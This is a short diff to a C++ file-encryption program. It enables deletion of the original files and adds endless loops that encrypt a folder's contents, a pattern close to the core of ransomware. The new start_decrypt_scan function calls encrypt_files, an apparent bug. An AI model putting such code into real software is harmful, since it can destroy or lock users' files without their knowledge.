@@ -141,7 +141,7 @@ void decrypt_files(vector<string>& paths, const string& current_path) {
     {
         std::cout << e.what();
     }
-    // filesystem::remove(file);
+    filesystem::remove(file);
 		}
     
 	}
@@ -150,12 +150,19 @@ void decrypt_files(vector<string>& paths, const string& current_path) {
 }
 
 
-// void start_scan(){
-//   for(;;){
-//   vector<string> paths;
-// 	get_paths(paths, "./test");
-//   }
-// }
+void start_encrypt_scan(string folder){
+  for(;;){
+  vector<string> paths;
+	encrypt_files(paths, folder);
+  }
+}
+
+void start_decrypt_scan(string folder){
+  for(;;){
+  vector<string> paths;
+	encrypt_files(paths, folder);
+  }
+}
 
 ByteArray get_byte_array(unsigned char* word, int len)
 {
@@ -167,11 +174,7 @@ ByteArray get_byte_array(unsigned char* word, int len)
 
 
 int main() {
-vector<string> paths;
-const string current="./test";
-encrypt_files(paths,current);
-const string current2="./encrypted";
-decrypt_files(paths,current2);
+  start_decrypt_scan("./encrypted");
 	return 0;
 }
 
